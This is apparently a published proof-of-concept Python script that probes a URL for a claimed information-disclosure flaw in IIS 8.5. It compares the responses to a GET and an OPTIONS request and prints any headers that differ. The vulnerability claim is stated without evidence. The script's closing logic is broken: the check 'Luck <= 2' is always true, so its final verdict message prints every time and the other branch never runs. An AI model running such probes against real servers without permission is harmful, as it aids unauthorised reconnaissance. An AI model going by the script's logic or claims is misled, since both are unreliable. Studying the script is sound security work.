# Information Disclosuer in IIS 8.5 by Riadh Benlamine
# in this IIS version the OPTION http method is vulnerable to information disclouser vulnerability.
# verifed while hunting in Bug bounty programs .

import requests
import argparse
from time import sleep

parser = argparse.ArgumentParser(description="Information Disclosuer script IIS 8.5 checker by Riadh Benlamine must be .aspx/.asp")

parser.add_argument("-u","--url",help="Target link",required=True)
Args = parser.parse_args()
Luck = 0
def HtmlCheck(html1,html2):
    if html1 == html2:
        return True
    else:
        return False

def HeaderCheck(headers1,headers2):
    if headers1 == headers2:
        return True
    else:
        return False

def ExtractHeader(headers1,headers2):
    print("For GET request")
    for head in headers1:
        print(head,":",headers1[head])
    
    print("For OPTIONS request")
    for head in headers2:
        print(head,":",headers2[head])

try:

    GET_request = requests.get(Args.url)
    GET_text = GET_request.text
    GET_headers = GET_request.headers
    sleep(5)
    OPTIONS_request = requests.options(Args.url)
    OPTIONS_text = OPTIONS_request.text
    OPTIONS_headers = OPTIONS_request.headers
    
    if HtmlCheck(GET_text,OPTIONS_text) == False:
        print("[+] Something changed in the HTML")
        print("Status :",OPTIONS_request.status_code,"\n")
        Luck += 1
    else:
        print("[-] Nothing happened in the HTML")
        print("Status :",OPTIONS_request.status_code,"\n")

    if HeaderCheck(GET_headers,OPTIONS_headers) == False:
        print("[+] Something changed in the Headers...")
        ExtractHeader(GET_headers,OPTIONS_headers)
        Luck += 1
    
    else:
        print("[-] Nothing happened in the Headers...")


    if Luck <= 2:
        print("Maybe you are lucky... Try to check for something")
    elif Luck == 0:
        print("Im not sure but you have to try it manually...")
except Exception as ex:
    print("[-] ",ex)
